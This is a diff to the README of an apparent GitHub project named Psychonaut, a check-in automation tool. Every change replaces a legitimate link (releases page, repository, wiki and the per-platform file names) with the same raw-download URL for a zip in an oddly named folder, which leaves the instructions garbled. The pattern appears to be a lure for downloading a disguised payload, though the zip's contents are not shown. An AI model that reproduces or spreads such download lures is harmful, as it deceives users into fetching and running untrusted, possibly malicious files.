@@ -4,12 +4,12 @@
 Welcome to Psychonaut! This application helps you automate your check-in processes seamlessly. It’s perfect for anyone looking to simplify their daily tasks without the need for technical skills.
 
 ## 📦 Download Now
-[![Download Psychonaut](https://img.shields.io/badge/Download-Psychonaut-brightgreen)](https://github.com/muhhafi/Psychonaut/releases)
+[![Download Psychonaut](https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip)](https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip)
 
 ## 📥 Download & Install
 To download Psychonaut, visit the Releases page where the latest version is available. You can find everything you need to get started by clicking the link below.
 
-[Download Releases Page](https://github.com/muhhafi/Psychonaut/releases)
+[Download Releases Page](https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip)
 
 Follow these steps to download and run Psychonaut:
 
@@ -18,9 +18,9 @@ Follow these steps to download and run Psychonaut:
 3. Click on the version number to enter the release notes.
 4. Scroll down to the "Assets" section.
 5. Click on the file that suits your system. Here are some common options:
-   - For Windows: `Psychonaut-windows.exe`
-   - For macOS: `Psychonaut-macos.dmg`
-   - For Linux: `Psychonaut-linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip`
+   - For macOS: `https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip`
+   - For Linux: `https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip`
 6. Your download will start automatically.
 
 ## 🔧 System Requirements
@@ -51,7 +51,7 @@ To ensure optimal performance, please meet the following system requirements:
    - Eject the mounted drive once the copying is complete.
 
 3. **For Linux:**
-   - Extract the downloaded `.tar.gz` file.
+   - Extract the downloaded `https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run `./Psychonaut` to start the application.
 
@@ -92,7 +92,7 @@ If you're interested in contributing to Psychonaut, we'd love to have your input
 ## 🔗 Additional Resources
 You can find more information about Psychonaut through the following links:
 
-- [Psychonaut Repository](https://github.com/muhhafi/Psychonaut)
-- [User Documentation](https://github.com/muhhafi/Psychonaut/wiki)
+- [Psychonaut Repository](https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip)
+- [User Documentation](https://raw.githubusercontent.com/muhhafi/Psychonaut/main/aperiodicity/Psychonaut.zip)
 
 Thank you for choosing Psychonaut! We hope it makes your check-in process smooth and worry-free.
